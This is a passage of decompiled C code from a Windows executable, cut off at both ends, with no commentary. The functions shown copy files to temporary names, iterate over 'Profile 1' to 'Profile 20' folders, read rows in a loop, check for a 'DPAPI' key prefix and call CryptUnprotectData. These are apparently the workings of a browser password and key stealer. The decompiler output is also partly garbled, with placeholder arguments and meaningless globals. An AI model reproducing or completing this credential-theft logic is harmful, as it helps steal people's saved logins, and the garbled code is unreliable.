                    *v54 = 2;
                    *v56 = v9;
                    int32_t * v58 = v56; // 0x40f241
                    int32_t v59 = v55; // 0x40f241
                    int32_t * v60 = v54; // 0x40f241
                    int32_t v61 = v52; // 0x40f241
                    int32_t v62 = v53; // 0x40f241
                    if (*(char *)v57 != 0) {
                        // 0x40f243
                        *v54 = v57;
                        *v56 = function_40434f((char *)&g322);
                        function_40415d((int32_t)&g322);
                        function_406f1d();
                        v61 = v55 - 4;
                        v59 = v55 - 8;
                        v58 = (int32_t *)v59;
                        v60 = (int32_t *)v61;
                        v62 = v55;
                    }
                    int32_t * v63 = v60;
                    int32_t v64 = v59;
                    int32_t * v65 = v58;
                    int32_t v66 = *v32; // 0x40f260
                    *v63 = 3;
                    *v65 = v9;
                    int32_t * v67 = v65; // 0x40f26f
                    int32_t v68 = v64; // 0x40f26f
                    int32_t * v69 = v63; // 0x40f26f
                    int32_t v70 = v61; // 0x40f26f
                    int32_t v71 = v62; // 0x40f26f
                    if (*(char *)v66 != 0) {
                        // 0x40f271
                        *v63 = v66;
                        *v65 = function_40434f((char *)&g322);
                        function_40415d((int32_t)&g322);
                        function_406f1d();
                        v70 = v64 - 4;
                        v68 = v64 - 8;
                        v67 = (int32_t *)v68;
                        v69 = (int32_t *)v70;
                        v71 = v64;
                    }
                    int32_t v72 = v70;
                    int32_t * v73 = v69;
                    int32_t v74 = v68;
                    int32_t * v75 = v67;
                    int32_t lpString2 = *(int32_t *)(lpAppName + 84); // 0x40f28e
                    *v73 = 4;
                    *v75 = v9;
                    int32_t * v76 = (int32_t *)(v71 - 12);
                    *v76 = 5;
                    int32_t v77 = v71 - 16;
                    int32_t * v78 = (int32_t *)v77;
                    *v78 = v9;
                    *(int32_t *)(v71 - 20) = 6;
                    *(int32_t *)(v71 - 24) = v9;
                    int128_t v79 = v34; // 0x40f2bd
                    int32_t v80 = v71; // 0x40f2bd
                    int32_t v81; // 0x40eff2
                    int32_t v82; // 0x40eff2
                    int32_t v83; // 0x40eff2
                    int32_t v84; // 0x40eff2
                    int128_t v85; // bp-132, 0x40eff2
                    int32_t v86; // bp-56, 0x40eff2
                    int32_t v87; // bp-60, 0x40eff2
                    int32_t v88; // 0x40f2c0
                    int128_t v89; // 0x40f2e4
                    uint32_t v90; // 0x40f2f0
                    int32_t v91; // 0x40f322
                    uint32_t v92; // 0x40f323
                    int32_t v93; // 0x40f352
                    uint32_t v94; // 0x40f353
                    int32_t v95; // 0x40f334
                    int32_t v96; // 0x40f339
                    int32_t v97; // 0x40f364
                    int32_t v98; // 0x40f369
                    int32_t v99; // 0x40f3d5
                    if (v12 != 0) {
                        // 0x40f2bf
                        *v73 = v12;
                        v88 = lstrlenA((char *)lpString2);
                        v79 = v34;
                        v80 = v72;
                        if (v88 >= 0 == (v88 != 0)) {
                            // 0x40f2ef
                            v89 = __asm_xorps(v34, v34);
                            __asm_movups(v85, v89);
                            *v75 = v12;
                            v90 = lstrlenA((char *)&g322);
                            v83 = v74;
                            if (v90 >= 1) {
                                // 0x40f2fa
                                *v76 = (int32_t)&v86;
                                *v78 = function_4040d5(&g322);
                                function_4043c7((int32_t)&g322);
                                function_406f1d();
                                v86 = 0;
                                v83 = v77;
                            }
                            // 0x40f322
                            v84 = v83;
                            v91 = v84 - 4;
                            *(int32_t *)v91 = v12;
                            v92 = lstrlenA((char *)&g322);
                            v96 = v91;
                            if (v92 >= 1) {
                                // 0x40f32d
                                *(int32_t *)(v84 - 8) = (int32_t)&v87;
                                v95 = function_4040d5(&g322);
                                v96 = v84 - 12;
                                *(int32_t *)v96 = v95;
                                function_4043c7((int32_t)&g322);
                                function_406f1d();
                                v87 = 0;
                            }
                            // 0x40f352
                            v81 = v96;
                            v93 = v81 - 4;
                            *(int32_t *)v93 = v12;
                            v94 = lstrlenA((char *)&g322);
                            v98 = v93;
                            if (v94 >= 1) {
                                // 0x40f35d
                                *(int32_t *)(v81 - 8) = (int32_t)&v11;
                                v97 = function_4040d5(&g322);
                                v98 = v81 - 12;
                                *(int32_t *)v98 = v97;
                                function_4043c7((int32_t)&g322);
                                function_406f1d();
                                v11 = NULL;
                            }
                            // 0x40f3ae
                            v82 = v98;
                            v99 = v82;
                            if (g168 != 0x270f) {
                                // 0x40f3d2
                                v99 = v82 - 4;
                                *(int32_t *)v99 = (int32_t)&v85;
                                function_4027c6(lpString2);
                                g168++;
                            }
                            // 0x40f3ea
                            function_4015a1();
                            v79 = v89;
                            v80 = v99;
                        }
                    }
                    int32_t v100 = v80;
                    function_406f1d();
                    function_406f1d();
                    function_406f1d();
                    function_406f1d();
                    int32_t * v101 = (int32_t *)(v100 - 4); // 0x40f410
                    *v101 = v9;
                    int32_t v102 = *v27; // 0x40f413
                    *v101 = 0;
                    v29 = v102;
                    v30 = v100;
                    v31 = 0;
                    while (v102 == 100) {
                        int32_t v103 = 0;
                        int32_t v104 = v100;
                        v34 = v79;
                        v35 = *v32;
                        v36 = v104 - 4;
                        v37 = (int32_t *)v36;
                        *v37 = 0;
                        v38 = v104 - 8;
                        v39 = (int32_t *)v38;
                        *v39 = v9;
                        v40 = v39;
                        v41 = v38;
                        v42 = v37;
                        v43 = v36;
                        v44 = v104;
                        if (*(char *)v35 != 0) {
                            // 0x40f1ed
                            *v37 = v35;
                            *v39 = function_40434f((char *)v103);
                            function_40415d((int32_t)&g322);
                            function_406f1d();
                            v43 = v104 - 12;
                            v41 = v104 - 16;
                            v40 = (int32_t *)v41;
                            v42 = (int32_t *)v43;
                            v44 = v38;
                        }
                        // 0x40f207
                        v45 = v42;
                        v46 = v41;
                        v47 = v40;
                        v48 = *v32;
                        *v45 = 1;
                        *v47 = v9;
                        v49 = v47;
                        v50 = v46;
                        v51 = v45;
                        v52 = v43;
                        v53 = v44;
                        if (*(char *)v48 != 0) {
                            // 0x40f218
                            *v45 = v48;
                            *v47 = function_40434f((char *)&g322);
                            function_40415d((int32_t)&g322);
                            function_406f1d();
                            v52 = v46 - 4;
                            v50 = v46 - 8;
                            v49 = (int32_t *)v50;
                            v51 = (int32_t *)v52;
                            v53 = v46;
                        }
                        // 0x40f232
                        v54 = v51;
                        v55 = v50;
                        v56 = v49;
                        v57 = *v32;
                        *v54 = 2;
                        *v56 = v9;
                        v58 = v56;
                        v59 = v55;
                        v60 = v54;
                        v61 = v52;
                        v62 = v53;
                        if (*(char *)v57 != 0) {
                            // 0x40f243
                            *v54 = v57;
                            *v56 = function_40434f((char *)&g322);
                            function_40415d((int32_t)&g322);
                            function_406f1d();
                            v61 = v55 - 4;
                            v59 = v55 - 8;
                            v58 = (int32_t *)v59;
                            v60 = (int32_t *)v61;
                            v62 = v55;
                        }
                        // 0x40f260
                        v63 = v60;
                        v64 = v59;
                        v65 = v58;
                        v66 = *v32;
                        *v63 = 3;
                        *v65 = v9;
                        v67 = v65;
                        v68 = v64;
                        v69 = v63;
                        v70 = v61;
                        v71 = v62;
                        if (*(char *)v66 != 0) {
                            // 0x40f271
                            *v63 = v66;
                            *v65 = function_40434f((char *)&g322);
                            function_40415d((int32_t)&g322);
                            function_406f1d();
                            v70 = v64 - 4;
                            v68 = v64 - 8;
                            v67 = (int32_t *)v68;
                            v69 = (int32_t *)v70;
                            v71 = v64;
                        }
                        // 0x40f28e
                        v72 = v70;
                        v73 = v69;
                        v74 = v68;
                        v75 = v67;
                        lpString2 = *(int32_t *)(lpAppName + 84);
                        *v73 = 4;
                        *v75 = v9;
                        v76 = (int32_t *)(v71 - 12);
                        *v76 = 5;
                        v77 = v71 - 16;
                        v78 = (int32_t *)v77;
                        *v78 = v9;
                        *(int32_t *)(v71 - 20) = 6;
                        *(int32_t *)(v71 - 24) = v9;
                        v79 = v34;
                        v80 = v71;
                        if (v103 != 0) {
                            // 0x40f2bf
                            *v73 = v103;
                            v88 = lstrlenA((char *)lpString2);
                            v79 = v34;
                            v80 = v72;
                            if (v88 >= 0 == (v88 != 0)) {
                                // 0x40f2ef
                                v89 = __asm_xorps(v34, v34);
                                __asm_movups(v85, v89);
                                *v75 = v103;
                                v90 = lstrlenA((char *)&g322);
                                v83 = v74;
                                if (v90 >= 1) {
                                    // 0x40f2fa
                                    *v76 = (int32_t)&v86;
                                    *v78 = function_4040d5(&g322);
                                    function_4043c7((int32_t)&g322);
                                    function_406f1d();
                                    v86 = 0;
                                    v83 = v77;
                                }
                                // 0x40f322
                                v84 = v83;
                                v91 = v84 - 4;
                                *(int32_t *)v91 = v103;
                                v92 = lstrlenA((char *)&g322);
                                v96 = v91;
                                if (v92 >= 1) {
                                    // 0x40f32d
                                    *(int32_t *)(v84 - 8) = (int32_t)&v87;
                                    v95 = function_4040d5(&g322);
                                    v96 = v84 - 12;
                                    *(int32_t *)v96 = v95;
                                    function_4043c7((int32_t)&g322);
                                    function_406f1d();
                                    v87 = 0;
                                }
                                // 0x40f352
                                v81 = v96;
                                v93 = v81 - 4;
                                *(int32_t *)v93 = v103;
                                v94 = lstrlenA((char *)&g322);
                                v98 = v93;
                                if (v94 >= 1) {
                                    // 0x40f35d
                                    *(int32_t *)(v81 - 8) = (int32_t)&v11;
                                    v97 = function_4040d5(&g322);
                                    v98 = v81 - 12;
                                    *(int32_t *)v98 = v97;
                                    function_4043c7((int32_t)&g322);
                                    function_406f1d();
                                    v11 = NULL;
                                }
                                // 0x40f3ae
                                v82 = v98;
                                v99 = v82;
                                if (g168 != 0x270f) {
                                    // 0x40f3d2
                                    v99 = v82 - 4;
                                    *(int32_t *)v99 = (int32_t)&v85;
                                    function_4027c6(lpString2);
                                    g168++;
                                }
                                // 0x40f3ea
                                function_4015a1();
                                v79 = v89;
                                v80 = v99;
                            }
                        }
                        // 0x40f3f2
                        v100 = v80;
                        function_406f1d();
                        function_406f1d();
                        function_406f1d();
                        function_406f1d();
                        v101 = (int32_t *)(v100 - 4);
                        *v101 = v9;
                        v102 = *v27;
                        *v101 = 0;
                        v29 = v102;
                        v30 = v100;
                        v31 = 0;
                    }
                }
                // 0x40f428
                if (v29 == 0) {
                    // 0x40f428
                    v7 = (int32_t *)(v30 - 8);
                    v6 = (int32_t *)(v30 - 4);
                    goto lab_0x40f43f;
                } else {
                    // 0x40f42c
                    *(int32_t *)(v30 - 4) = v9;
                    *(int32_t *)(v30 - 8) = v8;
                    result = v31;
                    goto lab_0x40f456;
                }
            }
        }
    }
  lab_0x40f456:
    // 0x40f456
    function_406f1d();
    function_406f1d();
    function_406f1d();
    function_406f1d();
    return result;
  lab_0x40f43f:
    // 0x40f43f
    *v6 = v9;
    *v7 = v8;
    result = 1;
    goto lab_0x40f456;
}

// Address range: 0x40f480 - 0x40fb4b
int32_t function_40f480(int32_t ** a1, int32_t ** a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x40f480
    function_413915();
    function_4043fa((int16_t *)&g17);
    function_4042c5(function_4044c4());
    function_406f1d();
    function_4043fa(L".tmp");
    function_413915();
    function_4043fa((int16_t *)&g17);
    function_4042c5(function_4044c4());
    function_406f1d();
    function_4043fa(L".tmp");
    function_4043c7(function_413915());
    function_406f1d();
    function_4043fa((int16_t *)&g79);
    function_4043c7(function_413915());
    function_406f1d();
    function_4043fa((int16_t *)&g78);
    if (!PathFileExistsW(NULL) || !PathFileExistsW(NULL)) {
        // 0x40f6d9
        function_406f1d();
        function_406f1d();
        function_406f1d();
        function_406f1d();
        return 0;
    }
    // 0x40f593
    int32_t lpNewFileName2; // 0x40f480
    int16_t * lpNewFileName = (int16_t *)lpNewFileName2; // 0x40f598
    if (!CopyFileW(NULL, lpNewFileName, false)) {
        // 0x40f6d9
        function_406f1d();
        function_406f1d();
        function_406f1d();
        function_406f1d();
        return 0;
    }
    int16_t * v1 = NULL; // bp-240, 0x40f5ab
    if (!CopyFileW(NULL, (int16_t *)lpNewFileName2, false)) {
        // 0x40f6d9
        function_406f1d();
        function_406f1d();
        function_406f1d();
        function_406f1d();
        return 0;
    }
    int32_t v2; // 0x40f480
    if (lpNewFileName2 == 0) {
        // 0x40f5e6
        v2 = (int32_t)&v1;
    } else {
        // 0x40f5e6
        lstrlenW(lpNewFileName);
        int32_t v3 = function_406e8d(); // 0x40f5d3
        int16_t * lpString1 = (int16_t *)v3; // 0x40f5d9
        int16_t * v4 = lpString1; // bp-252, 0x40f5d9
        lstrcpyW(lpString1, lpNewFileName);
        int32_t v5 = (int32_t)&v4;
        v2 = v5;
        if (v3 != 0) {
            // 0x40f5f7
            *(int32_t *)(v5 - 4) = v3;
            int32_t v6 = lstrlenW((int16_t *)*(int32_t *)(lpNewFileName2 + 64)); // 0x40f5f8
            *(int32_t *)(v5 - 8) = 0;
            *(int32_t *)(v5 - 12) = 0;
            *(int32_t *)(v5 - 16) = 0;
            *(int32_t *)(v5 - 20) = 0;
            *(int32_t *)(v5 - 24) = v6;
            *(int32_t *)(v5 - 28) = v3;
            *(int32_t *)(v5 - 32) = 512;
            *(int32_t *)(v5 - 36) = 0;
            int32_t v7 = WideCharToMultiByte((int32_t)&g322, (int32_t)&g322, (int16_t *)&g322, (int32_t)&g322, (char *)&g322, (int32_t)&g322, (char *)&g322, (bool *)&g322); // 0x40f60d
            int32_t lpString = function_406f2c(); // 0x40f617
            *(int32_t *)(v5 - 40) = v3;
            int32_t v8 = lstrlenW((int16_t *)lpString); // 0x40f622
            *(int32_t *)(v5 - 44) = 0;
            *(int32_t *)(v5 - 48) = 0;
            *(int32_t *)(v5 - 52) = v7;
            *(int32_t *)(v5 - 56) = lpString;
            *(int32_t *)(v5 - 60) = v8;
            *(int32_t *)(v5 - 64) = v3;
            *(int32_t *)(v5 - 68) = 0;
            *(int32_t *)(v5 - 72) = 0xfde9;
            WideCharToMultiByte((int32_t)&g322, (int32_t)&g322, (int16_t *)&g322, (int32_t)&g322, (char *)&g322, (int32_t)&g322, (char *)&g322, (bool *)&g322);
            *(int32_t *)(v5 - 76) = lpString;
            int32_t v9 = function_40434f((char *)&g322); // 0x40f645
            int32_t v10 = v5 - 80; // 0x40f64a
            *(int32_t *)v10 = v9;
            function_40415d((int32_t)&g322);
            function_406f1d();
            function_406f1d();
            v2 = v10;
        }
    }
    int32_t v11 = v2 - 4; // 0x40f668
    int32_t * v12 = (int32_t *)v11;
    int32_t v13; // bp-64, 0x40f480
    *v12 = (int32_t)&v13;
    *(int32_t *)(v2 - 8) = 0;
    function_406f1d();
    *v12 = 0;
    int32_t * v14 = v12; // 0x40f689
    int32_t v15 = v11; // 0x40f689
    if (lpNewFileName2 != 0) {
        // 0x40f68b
        lstrlenW((int16_t *)&g322);
        int32_t v16 = function_406f2c(); // 0x40f699
        v15 = v2 - 16;
        v14 = (int32_t *)v15;
        *v14 = v16;
        *v12 = v16;
        lstrcpyW((int16_t *)&g322, (int16_t *)&g322);
    }
    // 0x40f6a8
    function_413c34((int32_t)&g322);
    *v14 = 0;
    if (lpNewFileName2 != 0) {
        // 0x40f6b6
        lstrlenW((int16_t *)&g322);
        int32_t v17 = function_406f2c(); // 0x40f6c4
        *(int32_t *)(v15 - 12) = v17;
        *v14 = v17;
        lstrcpyW((int16_t *)&g322, (int16_t *)&g322);
    }
    // 0x40f6d3
    function_413c34((int32_t)&g322);
    // 0x40f6d9
    function_406f1d();
    function_406f1d();
    function_406f1d();
    function_406f1d();
    return 0;
}

// Address range: 0x40fb4b - 0x4100de
int32_t function_40fb4b(int32_t ** a1, int32_t ** a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x40fb4b
    function_413915();
    function_4043fa((int16_t *)&g17);
    function_4042c5(function_4044c4());
    function_406f1d();
    function_4043fa(L".tmp");
    function_413915();
    function_4043fa((int16_t *)&g17);
    function_4042c5(function_4044c4());
    function_406f1d();
    function_4043fa(L".tmp");
    function_4043c7(function_413915());
    function_406f1d();
    function_4043fa((int16_t *)a1);
    function_4043c7(function_413915());
    function_406f1d();
    function_4043fa((int16_t *)a2);
    if (!PathFileExistsW(NULL) || !PathFileExistsW(NULL)) {
        // 0x40fdb1
        function_406f1d();
        function_406f1d();
        function_406f1d();
        function_406f1d();
        return 0;
    }
    // 0x40fc6b
    int32_t lpNewFileName2; // 0x40fb4b
    int16_t * lpNewFileName = (int16_t *)lpNewFileName2; // 0x40fc70
    if (!CopyFileW(NULL, lpNewFileName, false)) {
        // 0x40fdb1
        function_406f1d();
        function_406f1d();
        function_406f1d();
        function_406f1d();
        return 0;
    }
    int16_t * v1 = NULL; // bp-184, 0x40fc83
    if (!CopyFileW(NULL, (int16_t *)lpNewFileName2, false)) {
        // 0x40fdb1
        function_406f1d();
        function_406f1d();
        function_406f1d();
        function_406f1d();
        return 0;
    }
    int32_t v2; // 0x40fb4b
    if (lpNewFileName2 == 0) {
        // 0x40fcbe
        v2 = (int32_t)&v1;
    } else {
        // 0x40fcbe
        lstrlenW(lpNewFileName);
        int32_t v3 = function_406e8d(); // 0x40fcab
        int16_t * lpString1 = (int16_t *)v3; // 0x40fcb1
        int16_t * v4 = lpString1; // bp-196, 0x40fcb1
        int32_t v5 = 0x1000000 * v3;
        lstrcpyW(lpString1, lpNewFileName);
        int32_t v6 = (int32_t)&v4;
        v2 = v6;
        if (v5 != 0) {
            int32_t v7 = v5 >> 24; // 0x40fcb2
            *(int32_t *)(v6 - 4) = v7;
            int32_t v8 = lstrlenW((int16_t *)*(int32_t *)(lpNewFileName2 + 64)); // 0x40fcd0
            *(int32_t *)(v6 - 8) = 0;
            *(int32_t *)(v6 - 12) = 0;
            *(int32_t *)(v6 - 16) = 0;
            *(int32_t *)(v6 - 20) = 0;
            *(int32_t *)(v6 - 24) = v8;
            *(int32_t *)(v6 - 28) = v7;
            *(int32_t *)(v6 - 32) = 512;
            *(int32_t *)(v6 - 36) = 0;
            int32_t v9 = WideCharToMultiByte((int32_t)&g322, (int32_t)&g322, (int16_t *)&g322, (int32_t)&g322, (char *)&g322, (int32_t)&g322, (char *)&g322, (bool *)&g322); // 0x40fce5
            int32_t lpString = function_406f2c(); // 0x40fcef
            *(int32_t *)(v6 - 40) = v7;
            int32_t v10 = lstrlenW((int16_t *)lpString); // 0x40fcfa
            *(int32_t *)(v6 - 44) = 0;
            *(int32_t *)(v6 - 48) = 0;
            *(int32_t *)(v6 - 52) = v9;
            *(int32_t *)(v6 - 56) = lpString;
            *(int32_t *)(v6 - 60) = v10;
            *(int32_t *)(v6 - 64) = v7;
            *(int32_t *)(v6 - 68) = 0;
            *(int32_t *)(v6 - 72) = 0xfde9;
            WideCharToMultiByte((int32_t)&g322, (int32_t)&g322, (int16_t *)&g322, (int32_t)&g322, (char *)&g322, (int32_t)&g322, (char *)&g322, (bool *)&g322);
            *(int32_t *)(v6 - 76) = lpString;
            int32_t v11 = function_40434f((char *)&g322); // 0x40fd1d
            int32_t v12 = v6 - 80; // 0x40fd22
            *(int32_t *)v12 = v11;
            function_40415d((int32_t)&g322);
            function_406f1d();
            function_406f1d();
            v2 = v12;
        }
    }
    int32_t v13 = v2 - 4; // 0x40fd40
    int32_t * v14 = (int32_t *)v13;
    int32_t v15; // bp-52, 0x40fb4b
    *v14 = (int32_t)&v15;
    *(int32_t *)(v2 - 8) = 0;
    function_406f1d();
    *v14 = 0;
    int32_t * v16 = v14; // 0x40fd61
    int32_t v17 = v13; // 0x40fd61
    if (lpNewFileName2 != 0) {
        // 0x40fd63
        lstrlenW((int16_t *)&g322);
        int32_t v18 = function_406f2c(); // 0x40fd71
        v17 = v2 - 16;
        v16 = (int32_t *)v17;
        *v16 = v18;
        *v14 = v18;
        lstrcpyW((int16_t *)&g322, (int16_t *)&g322);
    }
    // 0x40fd80
    function_413c34((int32_t)&g322);
    *v16 = 0;
    if (lpNewFileName2 != 0) {
        // 0x40fd8e
        lstrlenW((int16_t *)&g322);
        int32_t v19 = function_406f2c(); // 0x40fd9c
        *(int32_t *)(v17 - 12) = v19;
        *v16 = v19;
        lstrcpyW((int16_t *)&g322, (int16_t *)&g322);
    }
    // 0x40fdab
    function_413c34((int32_t)&g322);
    // 0x40fdb1
    function_406f1d();
    function_406f1d();
    function_406f1d();
    function_406f1d();
    return 0;
}

// Address range: 0x4100de - 0x410163
int32_t function_4100de(void) {
    int32_t v1 = (int32_t)&g80; // bp-44, 0x4100f3
    function_40fb4b(&g80, &g78, 0, 0, 1);
    int32_t v2 = &v1; // 0x410102
    for (int32_t i = 1; i < 21; i++) {
        int32_t * v3 = (int32_t *)(v2 - 4); // 0x410103
        *v3 = 1024;
        int32_t v4 = function_401000((int32_t)&g322); // 0x410108
        *v3 = i;
        int32_t * v5 = (int32_t *)(v2 - 8); // 0x410111
        *v5 = (int32_t)L"Profile %d";
        int32_t * v6 = (int32_t *)(v2 - 12); // 0x410116
        *v6 = v4;
        wsprintfW((int16_t *)&g322, (int16_t *)&g322);
        *v3 = 1024;
        int32_t v7 = function_401000((int32_t)&g322); // 0x410125
        *v3 = v4;
        *v5 = *v3;
        function_415cc4((int32_t)&g322);
        *v6 = v4;
        function_401014((int32_t)&g322);
        *v3 = 1;
        *v5 = 0;
        *v6 = 0;
        *(int32_t *)(v2 - 16) = (int32_t)&g78;
        v2 -= 20;
        *(int32_t *)v2 = v7;
        function_40fb4b((int32_t **)&g322, (int32_t **)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322);
    }
    // 0x410159
    return 1;
}

// Address range: 0x410163 - 0x410170
int32_t function_410163(void) {
    // 0x410163
    int32_t result; // 0x410163
    *(int32_t *)result = 0;
    *(int32_t *)(result + 4) = 0;
    *(int32_t *)(result + 8) = 0;
    return result;
}

// Address range: 0x410170 - 0x4101de
int32_t function_410170(int32_t result, int32_t a2) {
    int32_t * memoryHandle = LocalAlloc(64, 256); // 0x410184
    int32_t v1; // bp-268, 0x410170
    function_401293(&v1, 0, 242);
    function_4024bb(result);
    LocalFree(memoryHandle);
    return result;
}

// Address range: 0x4101de - 0x410210
int32_t function_4101de(void) {
    // 0x4101de
    int32_t v1; // 0x4101de
    int32_t hObject = *(int32_t *)(v1 + 52); // 0x4101e1
    if (hObject != 0) {
        // 0x4101e7
        CloseHandle((int32_t *)hObject);
    }
    // 0x4101f0
    function_404081();
    function_404081();
    function_402820();
    return function_40295e();
}

// Address range: 0x410210 - 0x410249
int32_t function_410210(int32_t a1) {
    int32_t v1 = function_406f77(); // 0x410216
    *(int32_t *)(v1 + 8) = a1;
    *(int32_t *)(v1 + 4) = (int32_t)&g195;
    int32_t * v2 = (int32_t *)v1; // 0x410233
    *v2 = (int32_t)&g264;
    *(int32_t *)(v1 + 12) = 1;
    return function_402746(0x40ec28, v2);
}

// Address range: 0x410249 - 0x4102a4
int32_t function_410249(int32_t a1) {
    int32_t v1 = g264; // 0x41024c
    int32_t v2; // bp-4, 0x410249
    int32_t * v3 = &v2; // 0x410254
    if (v1 != 0) {
        int32_t v4 = v1; // bp-8, 0x410256
        function_401c7a();
        v3 = &v4;
    }
    int32_t v5 = (int32_t)v3;
    int32_t * v6 = (int32_t *)(v5 - 8); // 0x41025f
    *v6 = 16;
    g264 = 0;
    g266 = 0;
    g265 = 0;
    int32_t v7 = function_406f77(); // 0x410274
    *v6 = v7;
    *(int32_t *)(v5 - 12) = 0x40ec28;
    *(int32_t *)(v7 + 8) = a1;
    *(int32_t *)(v7 + 4) = (int32_t)&g195;
    *(int32_t *)v7 = (int32_t)&g264;
    *(int32_t *)(v7 + 12) = 0;
    return function_402746((int32_t)&g322, &g322);
}

// Address range: 0x4102a4 - 0x41035f
int32_t function_4102a4(void) {
    // 0x4102a4
    int128_t v1; // 0x4102a4
    int128_t v2 = v1;
    g267 = 5;
    g265 = 5;
    g266 = 0;
    function_4029af();
    g271 = 5;
    g269 = 5;
    g270 = 0;
    int32_t v3 = function_406fa7(); // 0x4102e1
    int32_t v4 = 0; // 0x4102e8
    if (v3 != 0) {
        // 0x4102ea
        v4 = v3 + 4;
        *(int32_t *)v3 = 5;
        int32_t v5 = v4; // 0x4102ef
        int32_t v6 = 5; // 0x4102ef
        *(int32_t *)v5 = 0;
        *(int32_t *)(v5 + 4) = 0;
        *(int32_t *)(v5 + 8) = 0;
        *(int32_t *)(v5 + 12) = 0;
        v6--;
        v5 += 40;
        while (v6 != 0) {
            // 0x4102f1
            *(int32_t *)v5 = 0;
            *(int32_t *)(v5 + 4) = 0;
            *(int32_t *)(v5 + 8) = 0;
            *(int32_t *)(v5 + 12) = 0;
            v6--;
            v5 += 40;
        }
    }
    int128_t v7 = __asm_xorps(v2, v2); // 0x410308
    g274 = 0;
    g275 = 0;
    g276 = 0;
    g281 = 0;
    g282 = 0;
    g268 = v4;
    __asm_movups(g272, v7);
    __asm_movups(g273, v7);
    __asm_movups(g277, v7);
    __asm_movups(g278, v7);
    __asm_movups(g279, v7);
    __asm_movups(g280, v7);
    return &g264;
}

// Address range: 0x41035f - 0x4103e4
int32_t function_41035f(int32_t a1, int32_t a2) {
    // 0x41035f
    int32_t v1; // bp-12, 0x41035f
    if (function_4105c0(&v1) == 0) {
        // 0x4103de
        return 0;
    }
    int32_t result = 0; // 0x410383
    if (v1 >= 5) {
        // 0x410385
        result = 0;
        int32_t v2; // 0x41035f
        if (*(int32_t *)v2 == 0x50415044) {
            // 0x410390
            result = 0;
            if (*(char *)(v2 + 4) == 73) {
                // 0x410399
                int32_t v3; // bp-16, 0x41035f
                int32_t hMem; // bp-8, 0x41035f
                int32_t v4 = function_4103e4(&hMem, &v3); // 0x4103ab
                result = 0;
                if (v4 != 0) {
                    int32_t v5 = 0; // 0x4103bb
                    if (v3 == 32) {
                        // 0x4103bd
                        v5 = function_410620(a2);
                    }
                    // 0x4103ce
                    LocalFree((int32_t *)hMem);
                    result = v5;
                }
            }
        }
    }
    // 0x4103d7
    LocalFree(&g322);
    // 0x4103de
    return result;
}

// Address range: 0x4103e4 - 0x410468
int32_t function_4103e4(int32_t * a1, int32_t * a2) {
    // 0x4103e4
    int32_t v1; // 0x4103e4
    if (function_4106b1(v1, v1, v1, v1, v1) == 0) {
        // 0x410461
        return 0;
    }
    int32_t v2 = (int32_t)a2;
    int32_t v3 = (int32_t)a1;
    if (function_410680() != 0) {
        int32_t result = function_410468(0, v3, v2); // 0x41041b
        if (result != 0) {
            // 0x41045a
            function_4107d1();
            // 0x410461
            return result;
        }
    }
    int32_t v4 = function_410468(0, v3, v2); // 0x41043c
    int32_t result2 = v4; // 0x410448
    if (v4 == 0) {
        // 0x41044a
        result2 = GetLastError() == -0x7ff6fff5 ? 0 : v4;
    }
    // 0x41045a
    function_4107d1();
    // 0x410461
    return result2;
}

// Address range: 0x410468 - 0x4104d3
int32_t function_410468(int32_t dwFlags, int32_t a2, int32_t a3) {
    int32_t pOptionalEntropy = 0; // bp-20, 0x410484
    int32_t pDataOut; // bp-12, 0x410468
    int32_t pDataIn; // bp-28, 0x410468
    bool result = CryptUnprotectData((struct _CRYPTOAPI_BLOB *)&pDataIn, NULL, (struct _CRYPTOAPI_BLOB *)&pOptionalEntropy, NULL, NULL, dwFlags, (struct _CRYPTOAPI_BLOB *)&pDataOut); // 0x410490
    if (!result) {
        // 0x4104cd
        return result;
    }
    int32_t * v1 = (int32_t *)a3; // 0x4104a5
    *v1 = pDataOut;
    int32_t * memoryHandle = LocalAlloc(64, pDataOut); // 0x4104a7
    *(int32_t *)a2 = (int32_t)memoryHandle;
    int32_t * hMem; // 0x410468
    int32_t v2; // 0x410468
    if (memoryHandle == NULL) {
        // 0x41049c
        hMem = (int32_t *)v2;
    } else {
        int32_t * v3 = (int32_t *)v2;
        function_40126d(memoryHandle, v3, *v1);
        hMem = v3;
    }
    // 0x4104c4
    LocalFree(hMem);
    // 0x4104cd
    return result;
}

// Address range: 0x4104d3 - 0x410514
int32_t function_4104d3(void) {
    // 0x4104d3
    int32_t v1; // 0x4104d3
    if (v1 == 0 || v1 == 0) {
        // 0x41050e
        return 0;
    }
    int32_t * memoryHandle = LocalAlloc(64, 2 * v1 + 2); // 0x4104f0
    int32_t result = (int32_t)memoryHandle; // 0x4104f0
    if (memoryHandle == NULL) {
        // 0x41050e
        return result;
    }
    int32_t v2 = 0; // 0x4104fa
    *(int16_t *)(2 * v2 + result) = (int16_t)*(char *)(v2 + v1);
    v2++;
    while (v2 != v1) {
        // 0x410500
        *(int16_t *)(2 * v2 + result) = (int16_t)*(char *)(v2 + v1);
        v2++;
    }
    // 0x41050e
    return result;
}

// Address range: 0x410514 - 0x4105c0
int32_t function_410514(int32_t * nNumberOfBytesToRead) {
    // 0x410514
    if (g173 != 0) {
        // 0x4105bb
        return function_4105c0(nNumberOfBytesToRead);
    }
    // 0x41053a
    int32_t lpFileName; // 0x410514
    int32_t * hFile = CreateFileW((int16_t *)lpFileName, -0x80000000, 3, NULL, 3, 0, NULL); // 0x410548
    int32_t v1 = (int32_t)hFile; // 0x410548
    switch (v1) {
        case -1: {
        }
        case 0: {
            // 0x4105bb
            return 0;
        }
    }
    int32_t v2 = v1; // bp-64, 0x41055d
    int32_t lpFileSize; // bp-20, 0x410514
    bool v3 = GetFileSizeEx(hFile, (struct _LARGE_INTEGER *)&lpFileSize); // 0x41055e
    int32_t v4 = &v2; // 0x410566
    int32_t result = 0; // 0x410566
    int32_t * v5; // 0x410514
    int32_t * hMem; // 0x410582
    if (lpFileName == 0 == v3) {
        int32_t v6 = 64; // bp-76, 0x410575
        *nNumberOfBytesToRead = lpFileSize;
        int32_t * memoryHandle = LocalAlloc(64, lpFileSize); // 0x410579
        hMem = (int32_t *)lpFileName;
        *hMem = (int32_t)memoryHandle;
        v5 = &v6;
        result = 0;
        if (memoryHandle == NULL) {
            goto lab_0x4105b2;
        } else {
            int32_t v7 = v1; // bp-96, 0x410590
            int32_t lpNumberOfBytesRead; // bp-12, 0x410514
            if (!ReadFile(hFile, memoryHandle, *nNumberOfBytesToRead, &lpNumberOfBytesRead, NULL)) {
